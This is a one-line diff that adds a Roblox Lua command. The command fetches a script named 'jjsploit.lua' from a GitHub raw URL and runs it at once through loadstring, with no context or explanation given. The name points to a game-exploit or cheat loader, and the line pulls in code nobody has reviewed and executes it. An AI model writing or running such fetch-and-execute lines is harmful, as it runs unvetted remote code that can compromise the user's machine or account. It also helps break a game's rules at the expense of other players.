@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/ivanvagunin/roblox/refs/heads/main/jjsploit.lua", true))()
